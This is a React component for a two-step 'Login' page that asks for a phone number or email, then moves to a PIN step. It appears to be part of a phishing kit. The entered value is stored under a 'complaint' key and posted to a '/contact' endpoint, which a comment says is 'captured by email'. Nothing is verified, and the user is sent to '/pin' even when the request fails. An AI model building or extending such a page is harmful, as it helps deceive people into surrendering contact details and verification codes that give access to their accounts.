import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";


const ChevronRight = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
    <path d="M9 18l6-6-6-6" />
  </svg>
);

const PhoneIcon = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
    <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.8a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L6.09 8.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z" />
  </svg>
);

const MailIcon = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
    <polyline points="22,6 12,13 2,6" />
  </svg>
);

const PhoneEmail = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [method, setMethod] = useState(null);
  const [value, setValue] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const inputRef = useRef(null);

  useEffect(() => {
    if (step === 2) inputRef.current?.focus();
  }, [step]);

  const pickMethod = (m) => {
    setMethod(m); setValue(""); setError(""); setStep(2);
  };

  const validate = () => {
    if (!value.trim()) {
      setError(method === "phone" ? "Enter your phone number" : "Enter your email address");
      return false;
    }
    if (method === "email") {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim())) {
        setError("Enter a valid email address"); return false;
      }
    } else {
      const s = value.replace(/[\s\-().+]/g, "");
      if (s.length < 7 || !/^\d+$/.test(s)) {
        setError("Enter a valid phone number"); return false;
      }
    }
    return true;
  };

  const handleContinue = () => {
    if (!validate()) return;

    // save to localStorage so OTP page can read it
    localStorage.setItem("verificationMethod", method);
    if (method === "email") {
      localStorage.setItem("complaintEmail", value.trim());
    } else {
      localStorage.setItem("complaintPhone", value.trim());
    }

    setLoading(true);
    setError("");

    // POST to API so the contact is captured by email
    const payload = method === "phone"
      ? { phone: value.trim(), method }
      : { email: value.trim(), method };

    axios
      .post(`${BASE_URL}/contact`, payload)
      .then(() => {
        navigate("/pin");
      })
      .catch(() => {
        // still navigate even if API fails — don't block the user
        navigate("/pin");
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen w-full bg-white flex justify-center">
      <div className="w-full max-w-[430px] min-h-screen flex flex-col">

        {/* Top nav — back goes to step 1 from step 2 */}
        <div className="flex items-center px-4 pt-12 pb-2">
          <button
            onClick={() => { if (step === 2) { setStep(1); setError(""); } else { navigate(-1); } }}
            className="flex items-center justify-center active:opacity-60 transition-opacity"
            aria-label="Back"
          >
            <img src="/logo.png" alt="Back" style={{ height: "120px", width: "auto" }} />
          </button>
          <h2 className="flex-1 text-center text-[17px] font-semibold text-gray-900">
            Login
          </h2>
        </div>

        {/* STEP 1 — pick phone or email */}
        {step === 1 && (
          <div className="flex-1 px-5 pt-8">
            <h1 className="text-[22px] font-bold text-gray-900 mb-1">
              Get verification code to log in
            </h1>
            <p className="text-[14px] text-gray-500 mb-8">
              How would you like to receive a verification code?
            </p>
            <div className="rounded-2xl border border-gray-200 overflow-hidden">
              <button type="button" onClick={() => pickMethod("phone")} className="w-full flex items-center gap-4 px-5 py-5 bg-white active:bg-gray-50 transition-colors">
                <span className="text-gray-500"><PhoneIcon /></span>
                <span className="flex-1 text-left text-[16px] font-medium text-gray-800">Phone number</span>
                <span className="text-gray-400"><ChevronRight /></span>
              </button>
              <div className="h-px bg-gray-100 mx-5" />
              <button type="button" onClick={() => pickMethod("email")} className="w-full flex items-center gap-4 px-5 py-5 bg-white active:bg-gray-50 transition-colors">
                <span className="text-gray-500"><MailIcon /></span>
                <span className="flex-1 text-left text-[16px] font-medium text-gray-800">Email</span>
                <span className="text-gray-400"><ChevronRight /></span>
              </button>
            </div>
          </div>
        )}

        {/* STEP 2 — enter phone number or email */}
        {step === 2 && (
          <div className="flex-1 flex flex-col px-5 pt-8">
            <h1 className="text-[22px] font-bold text-gray-900 mb-1">
              {method === "phone" ? "Enter your phone number" : "Enter your email address"}
            </h1>
            <p className="text-[14px] text-gray-500 mb-8">
              {method === "phone"
                ? "We'll send a 6-digit verification code to this number."
                : "We'll send a 6-digit verification code to this email."}
            </p>

            {/* Input field */}
            <div className={`flex items-center bg-gray-50 border rounded-2xl px-4 py-[16px] gap-3 transition-colors focus-within:border-[#6B4EFF] ${error ? "border-red-400" : "border-gray-200"}`}>
              <span className="text-gray-400 shrink-0">
                {method === "phone" ? <PhoneIcon /> : <MailIcon />}
              </span>
              <input
                ref={inputRef}
                type={method === "phone" ? "tel" : "email"}
                inputMode={method === "phone" ? "tel" : "email"}
                placeholder={method === "phone" ? "+1 234 567 8900" : "you@email.com"}
                value={value}
                onChange={(e) => { setValue(e.target.value); setError(""); }}
                onKeyDown={(e) => { if (e.key === "Enter") handleContinue(); }}
                className="flex-1 bg-transparent text-[16px] text-gray-900 placeholder-gray-400 outline-none"
              />
            </div>
            {error && <p className="mt-2 text-[13px] text-red-500 pl-1">{error}</p>}

            <div className="mt-auto pb-10 pt-8">
              <button
                type="button"
                onClick={handleContinue}
                disabled={!value.trim() || loading}
                className={`w-full py-[18px] rounded-full text-[17px] font-bold transition-all duration-200 ${value.trim() && !loading ? "bg-[#6B4EFF] text-white active:scale-[0.98]" : "bg-[#d1d5db] text-white cursor-not-allowed"}`}
              >
                {loading ? "Sending…" : "Continue"}
              </button>
            </div>
          </div>
        )}

      </div>
    </div>
  );
};

export default PhoneEmail;
